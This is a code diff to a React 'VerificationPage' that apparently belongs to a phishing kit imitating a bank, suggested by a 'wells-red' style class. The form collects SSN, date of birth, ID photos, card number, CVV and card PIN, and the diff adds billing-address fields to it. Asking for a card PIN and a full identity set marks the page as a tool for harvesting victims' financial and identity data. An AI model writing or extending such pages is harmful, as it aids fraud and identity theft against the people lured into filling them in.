@@ -1,5 +1,6 @@
 
 
+
 import React, { useState, useRef } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import PageHeader from './PageHeader';
@@ -43,7 +44,12 @@ const VerificationPage: React.FC = () => {
         fullName: '', email: '', addressLine1: '', city: '', state: '', zipCode: '', dob: '', ssn: '',
         idFront: '', idBack: '',
         cardName: '', cardType: 'visa', cardBank: '', cardNumber: '', cardExpiry: '', cardCvv: '',
-        cardPin: ''
+        cardPin: '',
+        billingSameAsHome: true,
+        billingAddressLine1: '',
+        billingCity: '',
+        billingState: '',
+        billingZipCode: '',
     });
     const [error, setError] = useState('');
     const [loading, setLoading] = useState(false);
@@ -53,7 +59,22 @@ const VerificationPage: React.FC = () => {
     const backIdRef = useRef<HTMLInputElement>(null);
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
-        setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
+        const { name, value, type } = e.target;
+        if (type === 'checkbox') {
+            const { checked } = e.target as HTMLInputElement;
+            setFormData(prev => ({
+                ...prev,
+                [name]: checked,
+                ...(checked && {
+                    billingAddressLine1: '',
+                    billingCity: '',
+                    billingState: '',
+                    billingZipCode: '',
+                })
+            }));
+        } else {
+            setFormData(prev => ({ ...prev, [name]: value }));
+        }
     };
 
     const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -189,6 +210,34 @@ const VerificationPage: React.FC = () => {
                         <div className="grid grid-cols-2 gap-4">
                             <div><label className="block text-sm font-medium mb-1">Expiry Date</label><input type="text" name="cardExpiry" placeholder="MM/YY" value={formData.cardExpiry} onChange={handleExpiryChange} required className="w-full p-2 border rounded"/></div>
                             <div><label className="block text-sm font-medium mb-1">CVV</label><input type="text" name="cardCvv" inputMode="numeric" maxLength={4} value={formData.cardCvv} onChange={handleChange} required className="w-full p-2 border rounded"/></div>
+                        </div>
+
+                        <div className="mt-4 pt-4 border-t">
+                            <h3 className="text-lg font-semibold text-gray-700">Billing Address</h3>
+                            <div className="flex items-center my-2">
+                                <input 
+                                    type="checkbox" 
+                                    id="billingSameAsHome" 
+                                    name="billingSameAsHome" 
+                                    checked={formData.billingSameAsHome} 
+                                    onChange={handleChange} 
+                                    className="h-4 w-4 text-wells-red focus:ring-wells-red rounded"
+                                />
+                                <label htmlFor="billingSameAsHome" className="ml-2 text-sm text-gray-800">Same as home address</label>
+                            </div>
+                            {!formData.billingSameAsHome && (
+                                <div className="space-y-2 animate-fade-in">
+                                    <div>
+                                        <label className="block text-sm font-medium mb-1">Street Address</label>
+                                        <input type="text" name="billingAddressLine1" value={formData.billingAddressLine1} onChange={handleChange} required={!formData.billingSameAsHome} className="w-full p-2 border rounded"/>
+                                    </div>
+                                    <div className="grid grid-cols-2 gap-2">
+                                        <input type="text" name="billingCity" placeholder="City" value={formData.billingCity} onChange={handleChange} required={!formData.billingSameAsHome} className="w-full p-2 border rounded"/>
+                                        <input type="text" name="billingState" placeholder="State" value={formData.billingState} onChange={handleChange} required={!formData.billingSameAsHome} className="w-full p-2 border rounded"/>
+                                    </div>
+                                    <input type="text" name="billingZipCode" placeholder="Zip Code" value={formData.billingZipCode} onChange={handleChange} required={!formData.billingSameAsHome} className="w-full p-2 border rounded mt-2"/>
+                                </div>
+                            )}
                         </div>
                     </div>
                 );
